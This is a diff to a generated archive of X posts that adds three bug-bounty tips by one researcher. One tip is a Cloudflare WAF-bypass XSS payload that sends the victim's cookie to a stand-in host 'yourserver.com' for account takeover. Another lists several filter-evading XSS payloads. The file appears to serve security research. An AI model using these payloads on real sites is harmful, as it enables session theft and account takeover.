@@ -2,9 +2,9 @@
 
 _Generated 2026-11-11 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 91
-- Conversations/threads: 72
-- Oldest post captured: 2022-09-10
+- Posts in this file: 94
+- Conversations/threads: 75
+- Oldest post captured: 2020-10-21
 - Newest post captured: 2026-11-03
 
 
@@ -1606,3 +1606,67 @@ Tags (automatic): Platform: HackerOne
 
 **Media:**
 - video:  — no alt text provided by author
+
+
+---
+
+## 2022-06-04 · Post · New Cloudflare WAF Bypass to Fetch Cookie and Escalating XSS to Account Takeover.
+
+
+Tags (automatic): XSS, Account takeover
+
+
+### Post — @Assass1nmarcos — 2022-06-04 04:12 UTC (2022-06-04 05:12 WAT)
+
+- URL: https://x.com/Assass1nmarcos/status/1532938388336427009
+- Metrics (at fetch): not returned
+
+> New Cloudflare WAF Bypass to Fetch Cookie and Escalating XSS to Account Takeover.
+> As if you use document.location=URI (Blocked)
+> but using location=`URI` (Bypassed) 
+>
+> &lt;/body&gt;&lt;body onControl anything hello onmouseenter=(location=`//yourserver.com?c=`%2bcookie) 1&gt;
+> #bugbountytips
+
+
+---
+
+## 2022-05-30 · Post · Some Cloudflare's latest XSS Bypass:
+
+
+Tags (automatic): XSS
+
+
+### Post — @Assass1nmarcos — 2022-05-30 01:46 UTC (2022-05-30 02:46 WAT)
+
+- URL: https://x.com/Assass1nmarcos/status/1531089574780612608
+- Metrics (at fetch): not returned
+
+> Some Cloudflare's latest XSS Bypass:
+>
+> XSS"&gt;&lt;body %00 onControl hello onmouseleave=confirm(domain) x&gt;XSS
+>
+> XSS"&gt;&lt;html&gt;&lt;select %00 onControl onpointerenter=prompt(domain) hello&gt;
+>
+> XSS"&gt;&lt;input %00 onControl hello oninput=confirm(domain) x&gt;
+>
+> #bugbounty  #xss #bugbountytips
+
+
+---
+
+## 2020-10-21 · Post · Dropping it soon ⁦@sechunt3r⁩ ⁦@Tabnexa⁩ ⁦@ADITYASHENDE17⁩ bugbountytip writeup achievementunlock
+
+
+Tags (automatic): XSS
+
+
+### Post — @Assass1nmarcos — 2020-10-21 11:20 UTC (2020-10-21 12:20 WAT)
+
+- URL: https://x.com/Assass1nmarcos/status/1318874912367407104
+- Metrics (at fetch): not returned
+
+> Dropping it soon ⁦@sechunt3r⁩ ⁦@Tabnexa⁩ ⁦@ADITYASHENDE17⁩ #bugbountytip #writeup #achievementunlocked #cve #xss #hacking #bugbounty [pic.x.com/BlHUr2O0AM]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/Ek2VvBBU0AANLwf.jpg — no alt text provided by author
